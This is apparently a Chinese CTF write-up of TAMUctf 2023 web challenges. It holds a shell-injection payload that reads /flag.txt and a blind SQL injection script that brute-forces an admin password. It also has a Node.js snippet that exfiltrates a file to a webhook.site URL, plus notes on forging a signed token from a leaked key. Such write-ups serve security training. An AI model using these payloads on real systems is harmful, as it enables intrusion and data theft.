
# web
### connect
源码
```python
import flask
import os

def escape_shell_cmd(data):
    for char in data:
        if char in '&#;`|*?~<>^()[]{}$\\':
            return False
        else:
            return True

app = flask.Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    return flask.render_template('index.html')

@app.route('/api/curl', methods=['POST'])
def curl():
    url = flask.request.form.get('ip')
    if escape_shell_cmd(url):
        command = "curl -s -D - -o /dev/null " + url + " | grep -oP '^HTTP.+[0-9]{3}'"
        output = os.popen(command).read().strip()
        # print(output)
        if 'HTTP' not in output:
            return flask.jsonify({'message': 'Error: No response'})
        return flask.jsonify({'message': output})

    else:
        return flask.jsonify({'message': 'Illegal Characters Detected'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8001)
```
问题出在这个函数,只能对第一个字符进行判断,根据第一个字符直接返回bool,属于逻辑漏洞
```python
def escape_shell_cmd(data):
    for char in data:
        if char in '&#;`|*?~<>^()[]{}$\\':
            return False
        else:
            return True
```
payload
```shell
?ip=%0Aecho "HTTP" `cat /flag.txt`%0A
```
### Logical
#sql
```python
import requests
#用这里的语句分别替换id中的内容即可爆库、表、字段
#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA
#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = 'xxx'
#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = 'xxx' and TABLE_NAME = 'xxx'
dic='0123456789abcdefghijklmnopqrstuvwxyz,}{_#-'
url='http://logical.tamuctf.com/api/chpass'
headers = {
    "Accept": "*/*",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Connection": "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://logical.tamuctf.com",
    "Referer": "http://logical.tamuctf.com/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
}
string=''
for i in range(11,100):
    for j in dic:
        # payload="username=kjie' || if(,1,0)-- "
        id="username=kjie' || substr((select password from users where username='admin'),{0},1)={1} -- ".format(str(i),ascii(j))
        print("current:",i,":",j)
        r=requests.post(url,data=id,headers=headers, verify=False)
        #盲注条件判断
        if "not exists" not in r.text:
            string+=j
            print(string)
            break

print(string)
```


### Migraine
#nodejs
```js
const path = require('path');
const express = require("express");
const app = express();
const port = 8000;

app.use(express.json());

process.on('uncaughtException', (err, origin) => {
    console.log(err);
});

app.get("/", function (req, res) {
    res.sendFile(path.join(__dirname+'/static/index.html'));
});

app.post("/", function (req, res) {
    var src = req.body['src'];
    console.log(src);

     if (src.match(/[A-Za-z0-9]/) != null) {
         res.status(418).end('Bad character detected.');
         return;
     }

    try {
        eval(src);
    } catch(err) {
        res.status(418).end('Error on eval.');
        return;
    }

    res.status(200).send('Success!');
    return;
});

app.listen(port, function () {
    console.log(`Example app listening on port ${port}!`);
});
```
nodejs版的无字母数字RCE,刚开始想的jsfuck就可以,但是jsfuck属于浏览器js,没有require关键字

--- 
>Unfortunately, `require` doesn't work inside JSFuck. Instead, we can use the global `process` object to access system APIs
>

```js
var url = "https://webhook.site/9da0ee84-9e58-4b73-a38b-635b77f325f0";
var n = 100;
var buffer = Buffer.allocUnsafe(n);
var fs = process.binding('fs');
var path = "flag.txt";
// I don't know what these args actually are, but an exception told me to use this many args
var fd = fs.open(path, 2, 3, 4, 5);
// one of these seeks, so make it zero lmao
fs.read(fd, buffer, 0, n, 0, 0, 0);
var flag = buffer.toString();
console.log(flag)
fetch(url + "?flag=" + flag);
```
😵为啥我外带不出来

### Blackbox
存在文件包含漏洞,但是限制了后缀为php&& `set_include_path('/templates');`

```php
//const SECRET_KEY = 'JYOFGX6w5ylmYXyHuMM2Rm7neHXLrBd2V0f5No3NlP8';  在config.php下
function verify_token(string $token) { 
  $token_data = explode('.', $token);
  if(hash('md5', SECRET_KEY . $token_data[0]) == $token_data[1]) {
    return true;
  }
  return false;
}
function is_admin(string $token) {

  if(verify_token($token)) {
    $db = new SQLite3(DB_FILE);

    $data = json_decode(base64_decode(explode('.', $token)[0]), TRUE);
    $username = $data['username'];
    $user_key = $data['user_key'];
    $admin = $data['admin'];

    $statement = $db->prepare('SELECT * FROM users WHERE username=:uname AND key=:ukey;');
    $statement->bindValue(':uname', $username);
    $statement->bindValue(':ukey', $user_key);
    $result = $statement->execute();

    if($result != false && $result->fetchArray() != false && $admin == true) {
      return true;
    }
    return false;
  }
}
```
1. token 必须满足 verify_token函数,在有SECRET_KEY的条件下很容易满足
2. 会对解码后的data进行一次数据库查询操作,又因为是预编译,我们无法注入,所以要想办法拿到一条数据

---
#sqlite
唉,git泄露,使用`git-dumper` 可以拿到 .db文件 ,然后[获取key值](https://inloop.github.io/sqlite-viewer/)再伪造token
![[Pasted image 20230503001117.png]]

[[Tricks#LFI2RCE]]
LFI2RCE 也可拿下
# reverse
- 
# pwn
- 
# crypto
- 
# Misc
- 

---
*相关wp*
https://github.com/tamuctf/tamuctf-2023



2023-04-3016:59